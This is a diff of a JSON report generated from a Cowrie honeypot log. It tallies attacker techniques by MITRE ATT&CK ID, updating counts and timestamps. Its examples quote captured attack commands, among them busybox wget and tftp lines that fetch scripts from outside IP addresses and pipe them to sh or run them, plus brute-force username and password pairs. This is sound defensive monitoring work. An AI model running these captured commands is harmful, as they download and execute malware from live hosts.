@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-16 14:03:36",
+  "generated": "2026-08-16 15:04:21",
   "totals": {
-    "commands": 1290,
-    "login_failed": 2790,
-    "login_success": 136,
-    "sessions": 2384
+    "commands": 1343,
+    "login_failed": 3145,
+    "login_success": 142,
+    "sessions": 2531
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 2790,
+      "count": 3145,
       "examples": [
         "usr1cv8 / usr1cv8",
         "serv / serv",
@@ -21,14 +21,14 @@
         "admin / Aa123456"
       ],
       "first": "2026-08-16T00:00:42.329332Z",
-      "last": "2026-08-16T14:01:27.690249Z",
-      "unique_ips": 96
+      "last": "2026-08-16T15:02:39.064032Z",
+      "unique_ips": 99
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 298,
+      "count": 301,
       "examples": [
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
@@ -37,14 +37,14 @@
         ">/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/"
       ],
       "first": "2026-08-16T00:06:13.111253Z",
-      "last": "2026-08-16T13:46:48.556504Z",
-      "unique_ips": 28
+      "last": "2026-08-16T14:36:15.073206Z",
+      "unique_ips": 29
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 168,
+      "count": 170,
       "examples": [
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
         "http://2.26.136.128/twget.sh",
@@ -53,14 +53,14 @@
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t"
       ],
       "first": "2026-08-16T00:06:13.111253Z",
-      "last": "2026-08-16T13:46:49.679983Z",
-      "unique_ips": 29
+      "last": "2026-08-16T14:29:13.246593Z",
+      "unique_ips": 30
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 136,
+      "count": 142,
       "examples": [
         "admin / admin",
         "enable\\x00 / linuxshell\\x00",
@@ -69,8 +69,8 @@
         "installer / installer"
       ],
       "first": "2026-08-16T00:06:11.647402Z",
-      "last": "2026-08-16T13:46:47.654499Z",
-      "unique_ips": 76
+      "last": "2026-08-16T14:37:21.622238Z",
+      "unique_ips": 79
     },
     {
       "id": "T1033",
@@ -90,7 +90,7 @@
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 11,
+      "count": 12,
       "examples": [
         "uname -a",
         "/bin/./uname -s -v -n -r -m",
@@ -99,8 +99,8 @@
         "uname -a && echo '---SEP---' && nproc && echo '---SEP---' && nvidia-smi --query-gpu=name --format=csv,noheader 2>/dev/nu"
       ],
       "first": "2026-08-16T00:42:14.174728Z",
-      "last": "2026-08-16T11:19:08.647789Z",
-      "unique_ips": 8
+      "last": "2026-08-16T14:37:22.650905Z",
+      "unique_ips": 9
     },
     {
       "id": "T1083",
@@ -197,11 +197,11 @@
     ],
     [
       "sh",
-      88
+      91
     ],
     [
       "shell",
-      55
+      58
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
@@ -209,11 +209,11 @@
     ],
     [
       "system",
-      37
+      40
     ],
     [
       "enable",
-      36
+      39
     ],
     [
       "shel",
@@ -221,7 +221,7 @@
     ],
     [
       "linuxshell",
-      25
+      27
     ],
     [
       "ping ;sh",
@@ -261,15 +261,15 @@
     ],
     [
       "ping; sh",
-      6
+      7
     ],
     [
       "/bin/busybox STC",
-      6
+      7
     ],
     [
       "/bin/busybox hostname TOASTER",
-      6
+      7
     ]
   ]
 }
